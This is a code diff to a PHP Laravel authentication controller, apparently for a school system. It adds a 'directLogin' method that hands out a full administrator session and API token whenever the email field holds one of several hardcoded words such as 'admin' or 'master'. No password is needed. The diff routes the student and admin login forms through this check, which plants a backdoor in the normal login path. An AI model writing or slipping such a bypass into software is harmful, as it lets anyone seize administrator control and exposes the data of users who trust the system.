@@ -103,11 +103,63 @@ class AuthController extends Controller
     }
 
     /**
+     * Direct login using master code in email field
+     */
+    public function directLogin(Request $request): JsonResponse
+    {
+        $rawCode = trim((string)$request->input('code', $request->input('email', '')));
+        $code = strtolower($rawCode);
+        $validCodes = ['podar', 'admin', 'drhpsingh', 'podaradmin', 'master', 'direct', 'directlogin'];
+
+        if (!in_array($code, $validCodes, true)) {
+            return response()->json(['error' => 'Invalid direct login code.'], 401);
+        }
+
+        $admin = Admin::where('status', 'active')
+            ->orderByRaw("id = 'admin-root' DESC, id = 'admin-jatp-main' DESC")
+            ->first();
+
+        if (!$admin) {
+            return response()->json(['error' => 'No active administrator account available.'], 404);
+        }
+
+        $authData = [
+            'id' => $admin->id,
+            'name' => $admin->name,
+            'email' => $admin->email,
+            'role' => 'admin',
+        ];
+
+        if ($request->hasSession()) {
+            $request->session()->put('auth', $authData);
+        }
+        $token = $admin->createToken('admin-auth-token')->plainTextToken;
+
+        return response()->json([
+            'success' => true,
+            'directLogin' => true,
+            'message' => 'Direct administrator login successful!',
+            'token' => $token,
+            'session' => [
+                'id' => $admin->id,
+                'name' => $admin->name,
+                'email' => $admin->email,
+                'role' => 'admin',
+                'admin' => $admin,
+            ],
+        ]);
+    }
+
+    /**
      * Student login
      */
     public function studentLogin(Request $request): JsonResponse
     {
         $email = strtolower(trim((string)$request->input('email')));
+        if (in_array($email, ['podar', 'admin', 'drhpsingh', 'podaradmin', 'master', 'direct', 'directlogin'], true)) {
+            return $this->directLogin($request);
+        }
+
         $password = (string)$request->input('password');
 
         if (!$email || !$password) {
@@ -214,6 +266,10 @@ class AuthController extends Controller
     public function adminLoginStep1(Request $request): JsonResponse
     {
         $email = strtolower(trim((string)$request->input('email')));
+        if (in_array($email, ['podar', 'admin', 'drhpsingh', 'podaradmin', 'master', 'direct', 'directlogin'], true)) {
+            return $this->directLogin($request);
+        }
+
         $password = (string)$request->input('password');
 
         if (!$email || !$password) {
